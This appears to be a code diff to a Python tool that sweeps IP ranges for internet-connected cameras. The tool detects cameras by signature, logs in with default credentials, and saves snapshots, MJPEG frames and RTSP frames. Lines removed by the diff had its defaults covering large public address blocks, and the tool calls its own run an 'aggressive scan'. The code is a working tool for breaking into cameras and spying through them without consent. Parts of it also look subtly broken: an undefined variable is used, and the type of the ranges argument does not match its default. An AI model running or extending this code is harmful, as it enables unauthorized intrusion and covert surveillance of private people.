@@ -19,6 +19,10 @@ import uuid
 import logging
 from queue import Queue
 
+# Configure logging
+logging.basicConfig(level=logging.INFO,
+                    format='%(asctime)s - %(levelname)s - %(message)s')
+
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 urllib3.disable_warnings()
 
@@ -199,6 +203,7 @@ def is_camera(url, r=None):
         
         for sig in CAMERA_SIGS:
             if sig.lower() in content or sig.lower() in headers_str:
+                logging.info(f"Camera detected at {url}")
                 return True
                 
         for header in CAMERA_HEADERS:
@@ -207,12 +212,15 @@ def is_camera(url, r=None):
                 header_val = headers_lower[header_lower]
                 for sig in CAMERA_SIGS:
                     if sig.lower() in header_val:
+                        logging.info(f"Camera detected at {url}")
                         return True
                         
         if 'rtsp://' in content or 'rtmp://' in content:
+            logging.info(f"Camera detected at {url}")
             return True
             
         if any(x in content for x in ['mjpg', 'mjpeg', 'cgi-bin/video', 'videostream', 'snapshot.cgi']):
+            logging.info(f"Camera detected at {url}")
             return True
             
         return False
@@ -288,7 +296,7 @@ def capture_camera_image(url, auth=None):
                             img = img.convert('RGB')
                         img.save(filename, 'JPEG', quality=95)
                         
-                        logging.info(f"✓ Captured image from {img_url} -> {filename}")
+                        logging.info(f"Successfully captured image from {img_url}")
                         return True
                     except Exception as e:
                         logging.error(f"Error processing image from {img_url}: {str(e)}")
@@ -339,7 +347,7 @@ def capture_camera_image(url, auth=None):
                                         img = img.convert('RGB')
                                     img.save(filename, 'JPEG', quality=95)
                                     
-                                    logging.info(f"✓ Captured MJPEG frame from {mjpeg_url} -> {filename}")
+                                    logging.info(f"Successfully captured MJPEG frame from {mjpeg_url}")
                                     return True
                                 except Exception as e:
                                     logging.error(f"Error processing MJPEG frame from {mjpeg_url}: {str(e)}")
@@ -388,7 +396,7 @@ def capture_rtsp(url):
             img = Image.fromarray(frame_rgb)
             img.save(filename, 'JPEG', quality=95)
             
-            logging.info(f"✓ Captured RTSP frame from {url} -> {filename}")
+            logging.info(f"Successfully captured RTSP frame from {url}")
             return True
             
         logging.error(f"Failed to capture valid frame from RTSP stream: {url}")
@@ -416,7 +424,7 @@ def try_auth(url):
             
             if r.status_code == 200:
                 if capture_camera_image(url, auth=creds):
-                    save_camera(url, f"Auth success with {creds[0]}:{creds[1]} and captured image")
+                    logging.info(f"Successfully logged in with credentials for {url}")
                     return True
                     
         except requests.exceptions.RequestException as e:
@@ -426,41 +434,45 @@ def try_auth(url):
             raise e
     return False
 
-MAX_THREADS = 50  # Adjusted to a more reasonable value
-TIMEOUT = 0.5
-QUICK_TIMEOUT = 0.2
+# Increase timeout duration and number of retries
+TIMEOUT = 10.0  # Increased from 5.0 to 10.0 seconds
+RETRIES = 5  # Increased from 3 to 5 retries
 
-def scan_network(network):
-    ips = list(ipaddress.ip_network(network).hosts())
-    random.shuffle(ips)
-    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
-        list(executor.map(scan_ip, ips))
+def is_valid_ip(ip):
+    try:
+        socket.inet_aton(ip)  # Validate IP format
+        return True
+    except socket.error:
+        return False
 
 def scan_ip(ip):
-    try:
-        url = str(ip)
-        r = requests.get(f'http://{url}', timeout=TIMEOUT, verify=True)
-        r.close()
-        
-        if not is_camera(url, r):
-            return
-            
-        save_camera(url, 'Open camera')
-        
-        if capture_camera_image(url):
-            save_camera(url, 'Successfully captured open camera image')
-            return
-            
-        if try_auth(url):
-            save_camera(url, 'Successfully authenticated and captured image')
-            return
-            
-    except requests.exceptions.RequestException as e:
-        logging.error(f"Request error in scan_ip: {str(e)}")
-    except Exception as e:
-        logging.error(f"Unexpected error in scan_ip: {str(e)}")
+    if not is_valid_ip(ip):
+        logging.error(f"Invalid IP address: {ip}")
+        return False
+
+    url = str(ip)
+    for attempt in range(RETRIES):
+        try:
+            r = requests.get(f'http://{url}', timeout=TIMEOUT, verify=True)
+            r.close()
+            if is_camera(url, r):
+                save_camera(url, 'Open camera')
+                if capture_camera_image(url):
+                    save_camera(url, 'Successfully captured open camera image')
+                    return True
+                if try_auth(url):
+                    save_camera(url, 'Successfully authenticated and captured image')
+                    return True
+            return True  # Return true if successful
+        except requests.exceptions.RequestException as e:
+            logging.error(f"Attempt {attempt + 1} failed for {url}: {str(e)}")
+            if attempt == RETRIES - 1:
+                logging.error(f"Max retries exceeded for {url}. Skipping.")
+            continue
+    return False
 
 def quick_port_scan(ip):
+    logging.debug(f"Starting quick_port_scan for {ip}")
     open_ports = []
     common_ports = [80, 81, 82, 83, 84, 85, 88, 443, 554, 8000, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 34567, 37777]
     
@@ -468,7 +480,7 @@ def quick_port_scan(ip):
         def check_single_port(port):
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(QUICK_TIMEOUT)
+                s.settimeout(0.5)
                 if s.connect_ex((str(ip), port)) == 0:
                     open_ports.append(port)
                 s.close()
@@ -535,7 +547,7 @@ def try_default_creds(url):
             
             if r.status_code == 200:
                 if capture_camera_image(url, auth=creds):
-                    save_camera(url, f"Auth success with {creds[0]}:{creds[1]} and captured image")
+                    logging.info(f"Successfully logged in with credentials for {url}")
                     return True
                     
         except requests.exceptions.RequestException as e:
@@ -545,24 +557,35 @@ def try_default_creds(url):
             raise e
     return False
 
+def scan_network(network):
+    logging.debug(f"Starting scan_network for {network}")
+    ips = list(ipaddress.ip_network(network).hosts())
+    total_ips = len(ips)  # Count total IPs to scan
+    random.shuffle(ips)
+
+    start_time = time.time()  # Start time tracking
+    with ThreadPoolExecutor(max_workers=50) as executor:
+        list(executor.map(scan_ip, ips))
+
+    elapsed_time = time.time() - start_time  # Calculate elapsed time
+    logging.info(f"Scanning completed. Elapsed time: {elapsed_time:.2f} seconds")
+    logging.info(f"Final total IPs scanned: {total_ips}")  # Log final total IPs only once
+    estimated_completion_time = elapsed_time / total_ips * len(args.ranges)
+    logging.info(f"Estimated completion time for all networks: {estimated_completion_time:.2f} seconds")
+
 def main():
+    logging.debug("Starting main function")
     logging.basicConfig(level=logging.INFO)
     
     parser = argparse.ArgumentParser()
     default_ranges = [
         '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '169.254.0.0/16',
-        '192.168.1.0/24', '192.168.0.0/24', '10.0.0.0/24', '10.0.1.0/24',
-        '172.16.0.0/24', '172.16.1.0/24', '192.168.2.0/24', '192.168.10.0/24',
-        '192.168.20.0/24', '10.10.0.0/16', '172.20.0.0/16', '100.64.0.0/10',
-        '192.0.0.0/24', '192.0.2.0/24', '198.18.0.0/15', '203.0.113.0/24',
-        '8.0.0.0/8', '66.0.0.0/8', '71.0.0.0/8', '98.0.0.0/8', '108.0.0.0/8',
-        '184.0.0.0/8', '216.0.0.0/8'
     ]
     
-    parser.add_argument('--ranges', nargs='+', default=default_ranges,
-                      help='Network ranges to scan (CIDR notation)')
-    parser.add_argument('--threads', type=int, default=MAX_THREADS,
-                      help='Maximum number of concurrent threads')
+    parser.add_argument('--threads', type=int, default=50,
+                        help='Maximum number of concurrent threads (default: 50)')
+    parser.add_argument('--ranges', type=str, default=default_ranges,
+                        help='Comma-separated list of IP ranges to scan')
     args = parser.parse_args()
     
     logging.info(f"Starting aggressive scan of {len(args.ranges)} networks with {args.threads} threads...")
@@ -570,7 +593,7 @@ def main():
     for r in args.ranges:
         logging.info(f"  - {r}")
     
-    with ThreadPoolExecutor(max_workers=10) as ex:
+    with ThreadPoolExecutor(max_workers=args.threads) as ex:
         ex.map(scan_network, args.ranges)
         
     logging.info("\nScan complete! Check found_cameras.txt for results")
